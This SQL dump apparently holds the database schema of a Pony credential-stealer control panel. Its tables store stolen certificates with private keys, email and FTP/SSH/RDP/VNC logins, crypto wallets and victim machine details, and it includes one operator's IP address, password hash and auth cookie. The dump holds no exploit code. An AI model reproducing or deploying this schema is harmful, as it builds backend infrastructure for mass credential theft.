-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Tempo de geração: 13/08/2025 às 10:17
-- Versão do servidor: 8.0.43
-- Versão do PHP: 8.1.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `mangueir_pom`
--
CREATE DATABASE IF NOT EXISTS `mangueir_pom` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `mangueir_pom`;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_cert`
--

CREATE TABLE `pony_cert` (
  `cert_id` int NOT NULL,
  `report_id` int NOT NULL,
  `import_time` datetime DEFAULT NULL,
  `cert_client` varchar(50) DEFAULT NULL,
  `data_hash` char(40) NOT NULL,
  `cert_data` longblob,
  `pvtkey_data` longblob
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_chart_helper`
--

CREATE TABLE `pony_chart_helper` (
  `chart_id` int NOT NULL,
  `chart_type` varchar(50) DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  `image_hash` char(40) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_domain`
--

CREATE TABLE `pony_domain` (
  `domain_id` int NOT NULL,
  `url` text,
  `url_hash` char(40) NOT NULL,
  `ping_status` varchar(100) DEFAULT NULL,
  `ping_time` datetime DEFAULT NULL,
  `import_time` datetime DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_domainlist`
--

CREATE TABLE `pony_domainlist` (
  `domain_id` int NOT NULL,
  `url_domain` varchar(250) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_email`
--

CREATE TABLE `pony_email` (
  `email_id` int NOT NULL,
  `report_id` int NOT NULL,
  `import_time` datetime DEFAULT NULL,
  `email_client` varchar(50) DEFAULT NULL,
  `email_hash` char(40) NOT NULL,
  `protocol` enum('smtp','imap','nntp','http','pop3','other') NOT NULL,
  `email` varchar(250) NOT NULL,
  `server` varchar(250) NOT NULL,
  `port` int DEFAULT '0',
  `user` varchar(250) NOT NULL,
  `pass` varchar(250) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_ftp`
--

CREATE TABLE `pony_ftp` (
  `ftp_id` int NOT NULL,
  `report_id` int NOT NULL,
  `url` text NOT NULL,
  `url_hash` char(40) NOT NULL,
  `url_type` enum('ftp','ssh','http','https','rdp','vnc') NOT NULL,
  `ftp_client` varchar(50) DEFAULT NULL,
  `import_time` datetime DEFAULT NULL,
  `domain_id` int DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_report`
--

CREATE TABLE `pony_report` (
  `report_id` int NOT NULL,
  `parsed` tinyint(1) DEFAULT '0',
  `import_time` datetime DEFAULT NULL,
  `report_os_name` varchar(150) DEFAULT NULL,
  `report_country` char(2) DEFAULT NULL,
  `report_is_win64` tinyint(1) DEFAULT NULL,
  `report_admin` tinyint(1) DEFAULT NULL,
  `report_source_ip` char(15) DEFAULT NULL,
  `report_hwid` char(40) DEFAULT NULL,
  `report_version` varchar(10) DEFAULT NULL,
  `data_id` int NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_report_data`
--

CREATE TABLE `pony_report_data` (
  `data_id` int NOT NULL,
  `data_hash` char(40) NOT NULL,
  `data` longblob
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_system_log`
--

CREATE TABLE `pony_system_log` (
  `log_id` int NOT NULL,
  `report_id` int DEFAULT NULL,
  `log_line` varchar(250) DEFAULT NULL,
  `log_source` enum('gate','report','login') NOT NULL,
  `log_type` enum('notify','error','other') NOT NULL,
  `log_extra` varchar(250) DEFAULT NULL,
  `import_time` datetime DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Despejando dados para a tabela `pony_system_log`
--

INSERT INTO `pony_system_log` (`log_id`, `report_id`, `log_line`, `log_source`, `log_type`, `log_extra`, `import_time`) VALUES
(1, NULL, '23.105.131.232', 'login', 'other', 'mangueir', '2017-12-17 03:41:06');

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_user`
--

CREATE TABLE `pony_user` (
  `user_id` int NOT NULL,
  `username` varchar(100) NOT NULL,
  `password` varchar(50) NOT NULL,
  `privileges` varchar(200) NOT NULL,
  `auth_cookie` varchar(50) DEFAULT NULL,
  `lang` varchar(50) DEFAULT NULL,
  `settings` text,
  `time_offset` int DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Despejando dados para a tabela `pony_user`
--

INSERT INTO `pony_user` (`user_id`, `username`, `password`, `privileges`, `auth_cookie`, `lang`, `settings`, `time_offset`) VALUES
(1, 'mangueir', '340d8d328094edbfe6cd900229f4326b852b0b6c', 'admin_all', 'fe7393365d9a93248dc1a3a79ab2fe88c6a25ac0', '', 'offset_url=MXwwfDB8MHwwfDA,\r\ndata_sum=MXww\r\noffset_report_duplicates=Mnww\r\noffset_nonparsed_reports_stats=MXww\r\noffset_nonparsed_reports_sum=MXww\r\noffset_log_events_count=Mnww\r\noffset_ftp_last=fHw,\r\noffset_http_last=fHw,\r\noffset_reports_last=fHw,\r\noffset_http_list=MA,,\r\noffset_email_list=MA,,', NULL);

-- --------------------------------------------------------

--
-- Estrutura para tabela `pony_wallet`
--

CREATE TABLE `pony_wallet` (
  `wallet_id` int NOT NULL,
  `report_id` int NOT NULL,
  `import_time` datetime DEFAULT NULL,
  `wallet_client` varchar(50) DEFAULT NULL,
  `data_hash` char(40) NOT NULL,
  `wallet_data` longblob
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `pony_cert`
--
ALTER TABLE `pony_cert`
  ADD PRIMARY KEY (`cert_id`),
  ADD UNIQUE KEY `data_hash` (`data_hash`),
  ADD KEY `report_id` (`report_id`),
  ADD KEY `import_time` (`import_time`);

--
-- Índices de tabela `pony_chart_helper`
--
ALTER TABLE `pony_chart_helper`
  ADD PRIMARY KEY (`chart_id`),
  ADD KEY `image_hash` (`image_hash`);

--
-- Índices de tabela `pony_domain`
--
ALTER TABLE `pony_domain`
  ADD PRIMARY KEY (`domain_id`),
  ADD UNIQUE KEY `url_hash` (`url_hash`);

--
-- Índices de tabela `pony_domainlist`
--
ALTER TABLE `pony_domainlist`
  ADD PRIMARY KEY (`domain_id`),
  ADD UNIQUE KEY `url_domain` (`url_domain`);

--
-- Índices de tabela `pony_email`
--
ALTER TABLE `pony_email`
  ADD PRIMARY KEY (`email_id`),
  ADD UNIQUE KEY `email_hash` (`email_hash`),
  ADD KEY `report_id` (`report_id`),
  ADD KEY `import_time` (`import_time`);

--
-- Índices de tabela `pony_ftp`
--
ALTER TABLE `pony_ftp`
  ADD PRIMARY KEY (`ftp_id`),
  ADD UNIQUE KEY `url_hash` (`url_hash`),
  ADD KEY `report_id` (`report_id`),
  ADD KEY `url_type` (`url_type`),
  ADD KEY `import_time` (`import_time`);

--
-- Índices de tabela `pony_report`
--
ALTER TABLE `pony_report`
  ADD PRIMARY KEY (`report_id`),
  ADD KEY `import_time` (`import_time`),
  ADD KEY `data_id` (`data_id`);

--
-- Índices de tabela `pony_report_data`
--
ALTER TABLE `pony_report_data`
  ADD PRIMARY KEY (`data_id`),
  ADD UNIQUE KEY `data_hash` (`data_hash`);

--
-- Índices de tabela `pony_system_log`
--
ALTER TABLE `pony_system_log`
  ADD PRIMARY KEY (`log_id`),
  ADD KEY `report_id` (`report_id`);

--
-- Índices de tabela `pony_user`
--
ALTER TABLE `pony_user`
  ADD PRIMARY KEY (`user_id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Índices de tabela `pony_wallet`
--
ALTER TABLE `pony_wallet`
  ADD PRIMARY KEY (`wallet_id`),
  ADD UNIQUE KEY `data_hash` (`data_hash`),
  ADD KEY `report_id` (`report_id`),
  ADD KEY `import_time` (`import_time`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `pony_cert`
--
ALTER TABLE `pony_cert`
  MODIFY `cert_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_chart_helper`
--
ALTER TABLE `pony_chart_helper`
  MODIFY `chart_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_domain`
--
ALTER TABLE `pony_domain`
  MODIFY `domain_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_domainlist`
--
ALTER TABLE `pony_domainlist`
  MODIFY `domain_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_email`
--
ALTER TABLE `pony_email`
  MODIFY `email_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_ftp`
--
ALTER TABLE `pony_ftp`
  MODIFY `ftp_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_report`
--
ALTER TABLE `pony_report`
  MODIFY `report_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_report_data`
--
ALTER TABLE `pony_report_data`
  MODIFY `data_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `pony_system_log`
--
ALTER TABLE `pony_system_log`
  MODIFY `log_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `pony_user`
--
ALTER TABLE `pony_user`
  MODIFY `user_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `pony_wallet`
--
ALTER TABLE `pony_wallet`
  MODIFY `wallet_id` int NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
